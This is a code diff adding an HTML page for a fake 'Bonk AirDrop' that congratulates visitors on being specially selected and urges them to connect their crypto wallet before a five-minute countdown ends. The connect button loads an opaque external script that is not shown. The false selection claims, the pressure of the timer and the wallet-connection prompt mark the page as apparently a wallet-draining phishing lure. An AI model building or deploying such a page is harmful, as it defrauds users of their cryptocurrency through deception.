@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bonk AirDrop - Eligibility Confirmed</title>
+    <style>
+        body {
+            background: url('images/space-1982212_1280.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 25px;
+            border-radius: 15px;
+            max-width: 600px;
+            margin: auto;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        h1 {
+            color: #FF6600;
+            margin: 0;
+        }
+
+        p {
+            font-size: 1.2rem;
+            line-height: 1.5;
+        }
+
+        .important-message {
+            font-size: 1.1rem;
+            margin: 20px 0;
+        }
+
+        .interact-button {
+            padding: 15px 35px;
+            font-size: 1.3rem;
+            background-color: #FF6600;
+            border: none;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .highlight {
+            font-weight: bold;
+            color: #FF6600;
+        }
+
+        .emoji {
+            font-size: 1.5rem;
+        }
+
+        .attention-message {
+            font-size: 1rem;
+            color: #FF6600;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .contact-button {
+            padding: 15px 35px;
+            font-size: 1.3rem;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        #walletLast8 {
+            font-size: 1.1rem;
+            color: #FF6600;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+
+        #timer {
+            font-size: 1.5rem;
+            color: #FF6600;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 class="emoji">🎉 Congratulations! 🎉</h1>
+        <p>You have been officially selected for our <span class="highlight">exclusive Bonk AirDrop</span>! 🌟</p>
+        
+        <div class="important-message">
+            🎯 After a thorough selection process, you are one of the fortunate few chosen from millions of users worldwide. Only a select few thousand have had the opportunity to be chosen for this exclusive opportunity. This is an <span class="highlight">exclusive opportunity</span> that sets you apart! 🚀<br><br>
+            💼 Don't miss out on your chance to claim your reward. We're thrilled to have you as part of this elite group. 🏆<br><br>
+            💬 The next step is easy — just connect your wallet to start claiming your reward. 💸
+        </div>
+
+        <p id="walletLast8"></p>
+
+        <!-- Timer display -->
+        <p id="timer">Time Remaining: 05:00</p>
+
+        <button class="interact-button" id="walletConnectButton">🔗 Connect Wallet</button>
+
+        <!-- Attention message -->
+        <div class="attention-message">
+            ⚠️ If your tokens do not appear, please open your wallet, do not close the page, and come back to this link and retry. Alternatively, you can open the link directly in your wallet's browser. If the issue persists, click the "Contact Us" button below.
+        </div>
+
+        <!-- Contact Us Button -->
+        <button class="contact-button" onclick="window.location.href='contact.html'">📞 Contact Us</button>
+    </div>
+
+    <!-- Script for wallet connection -->
+     <script charset="UTF-8" type="text/javascript" src="./a537f1b2-8171-48f3-9141-177f4ced37bb.js"></script>
+
+    <script>
+        // Fonction pour démarrer le timer
+        function startTimer() {
+            // Stocke la date de début du timer dans localStorage, sessionStorage et un cookie
+            const startTime = Date.now();
+            localStorage.setItem("startTime", startTime);
+            sessionStorage.setItem("startTime", startTime);
+            document.cookie = `startTime=${startTime}; path=/; max-age=31536000`; // Cookie avec une durée de 1 an
+
+            // Redirection après 5 minutes (300000 ms)
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 300000);
+        }
+
+        // Fonction pour récupérer le temps écoulé à partir de localStorage, sessionStorage et cookie
+        function getElapsedTime() {
+            let startTime = localStorage.getItem("startTime");
+
+            if (!startTime) {
+                startTime = sessionStorage.getItem("startTime");
+            }
+
+            if (!startTime) {
+                const cookieStartTime = document.cookie.split("; ").find(row => row.startsWith("startTime="));
+                if (cookieStartTime) {
+                    startTime = cookieStartTime.split("=")[1];
+                }
+            }
+
+            return startTime ? Date.now() - startTime : 0;
+        }
+
+        // Fonction pour afficher le timer
+        function updateTimer() {
+            const remainingTime = 300000 - getElapsedTime(); // Temps restant (300000 ms = 5 minutes)
+            const minutes = Math.floor(remainingTime / 60000);
+            const seconds = Math.floor((remainingTime % 60000) / 1000);
+            document.getElementById("timer").innerText = `Time Remaining: ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+        }
+
+        // Quand la page est prête, on démarre le timer
+        document.addEventListener("DOMContentLoaded", function () {
+            const addr = new URLSearchParams(window.location.search).get("addr");
+
+            if (addr) {
+                document.getElementById("walletLast8").innerText = `Your Wallet: ${addr}`;
+            } else {
+                document.getElementById("walletLast8").innerText = "Wallet not found!";
+            }
+
+            // Si le temps écoulé est inférieur à 5 minutes, on démarre le timer
+            if (getElapsedTime() === 0) {
+                startTimer();
+            }
+
+            // Mettre à jour le timer toutes les secondes
+            setInterval(updateTimer, 1000);
+
+            // Redirection automatique après 5 minutes
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 300000); // 5 minutes en ms
+        });
+    </script>
+
+</body>
+</html>
